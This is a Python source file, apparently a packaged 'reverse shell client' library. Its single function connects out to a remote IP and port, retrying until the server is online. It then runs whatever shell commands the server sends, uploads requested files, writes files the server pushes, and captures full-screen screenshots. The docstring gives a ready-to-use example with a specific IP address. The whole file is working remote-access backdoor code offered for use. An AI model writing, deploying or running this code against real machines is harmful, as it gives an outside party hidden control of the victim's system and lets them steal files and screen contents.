import os
import socket
import subprocess
from math import ceil

import mss
import pickle


def encode_cmd(cmd_encoded, byte_len, startcommand, endcommand):
    if isinstance(cmd_encoded, str):
        cmd_encoded = cmd_encoded.encode()
    cmd_full = startcommand + cmd_encoded + endcommand
    lencmdfull = len(cmd_full)
    whole_size = byte_len * ceil(lencmdfull / byte_len)
    cmd_add = (whole_size - lencmdfull) * b"\x00"
    return cmd_full + cmd_add


def connect_to_server(
    ipaddress: str,
    port: int,
    byte_len: int = 32768,
    command_putfile: str = "putfile",
    command_getfile: str = "getfile",
    command_screenshot: str = "screenshot",
    command_getcwd: str = "getcwd",
    command_putfile_sep: bytes = b"FILESEP",
    command_start: bytes = b"START_START_START",
    command_end: bytes = b"END_END_END",
    before_stdout: bytes = b"stdout:\nxxxxxxxxxxxxxxxxxx\n",
    before_stderr: bytes = b"\nxxxxxxxxxxxxxxxxxx\nstderr:\n",
):
    r"""
    Connect to the server at the specified IP address and port, and perform a reverse shell client-server communication.
    To install the server: https://pypi.org/project/reverseshellserver/

    Parameters:
        ipaddress (str): The IP address of the server to connect to.
        port (int): The port number of the server to connect to.
        byte_len (int, optional): The maximum size of each data chunk (in bytes) used for communication with the server.
        command_putfile (str, optional): The command prefix used to indicate a request from the server to send a file to the client.
        command_getfile (str, optional): The command prefix used to indicate a request from the server to receive a file from the client.
        command_screenshot (str, optional): The command that, when sent by the server, requests the client to take a screenshot and send it back as an image file.
        command_getcwd (str, optional): The command that, when sent by the server, requests the client to send the current working directory path.
        command_putfile_sep (bytes, optional): The separator used to split the 'putfile' command and the filename along with the file content.
        command_start (bytes, optional): The marker used to indicate the start of a command transmission.
        command_end (bytes, optional): The marker used to indicate the end of a command transmission.
        before_stdout (bytes, optional): Bytes to prepend before the standard output of the executed command in the response to the server.
        before_stderr (bytes, optional): Bytes to prepend before the standard error of the executed command in the response to the server.

    Note:
        - This function connects to the server specified by 'ipaddress' and 'port'.
        - It performs a continuous loop of client-server communication until interrupted.
        - The 'before_stdout' and 'before_stderr' parameters are used to format the response to the server when executing shell commands.
        - The 'command_putfile', 'command_getfile', 'command_screenshot', and 'command_getcwd' prefixes are used to indicate specific actions from the server.
        - The 'command_putfile_sep' is used to split the 'putfile' command and the filename along with the file content.
        - 'command_start' and 'command_end' are used to wrap the encoded command for large data transmissions.
    Example:
        from reverseshellclient import connect_to_server
        connect_to_server(
            ipaddress="171.181.217.19",
            port=12345,
            byte_len=32768,
            command_putfile="putfile",
            command_getfile="getfile",
            command_screenshot="screenshot",
            command_getcwd="getcwd",
            command_putfile_sep=b"FILESEP",
            command_start=b"START_START_START",
            command_end=b"END_END_END",
            before_stdout=b"stdout:\nxxxxxxxxxxxxxxxxxx\n",
            before_stderr=b"\nxxxxxxxxxxxxxxxxxx\nstderr:\n",
        )

    """
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (ipaddress, port)
            client_socket.connect(server_address)
            break
        except Exception:
            print("Server not online", end="\r")
    print(f"Connected to server at {''.join([str(x) for x in server_address])}")
    command_putfile_encoded = command_putfile.encode("utf-8") + b" "

    while True:
        try:
            cmd_from_server = b""

            while command_end not in cmd_from_server:
                cmd_from_server += client_socket.recv(byte_len)

            command = cmd_from_server.split(command_start, maxsplit=1)[1].split(
                command_end, maxsplit=1
            )[0]
            if command.startswith(command_putfile_encoded):
                putfilecommand, path, filecontent = command.split(
                    command_putfile_sep, maxsplit=2
                )
                path = path.decode("utf-8", "ignore")
                print(
                    f"Received command: {putfilecommand.decode('utf-8', 'ignore')}{path}"
                )
                with open(path, mode="wb") as f:
                    f.write(filecontent)
                abspath = os.path.normpath(os.path.join(os.getcwd(), path))
                allblocks = encode_cmd(abspath, byte_len, command_start, command_end)
                for datatosend in [allblocks[i:i + byte_len] for i in range(0, len(allblocks), byte_len)]:
                    client_socket.send(datatosend)
                continue
            command = command.decode("utf-8")
            print(f"Received command: {command}")
            if command == command_screenshot:
                with mss.mss() as sct:
                    img = sct.grab(sct.monitors[0])
                    datatosend = pickle.dumps(img)
            elif command.lower().startswith("cd "):
                os.chdir(command[3:].strip())
                datatosend = os.getcwd()
            elif command == command_getcwd:
                datatosend = os.getcwd()
            elif command.startswith(f"{command_getfile} "):
                filepath = command.split(maxsplit=1)[-1]
                if not os.path.exists(filepath):
                    datatosend = f"File {filepath} does not exists!"
                else:
                    with open(filepath, mode="rb") as fi:
                        datatosend = fi.read()
            else:
                p = subprocess.run(
                    command,
                    shell=True,
                    stderr=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                )
                datatosend = before_stdout + p.stdout + before_stderr + p.stderr
            allblocks = encode_cmd(datatosend, byte_len, command_start, command_end)
            for datatosend in [allblocks[i:i + byte_len] for i in range(0, len(allblocks), byte_len)]:
                client_socket.send(datatosend)
        except Exception as fe:
            datatosend = str(fe).encode("utf-8")
            datatosend = encode_cmd(datatosend, byte_len, command_start, command_end)
            client_socket.send(datatosend)
            continue
        except KeyboardInterrupt:
            client_socket.close()
            break
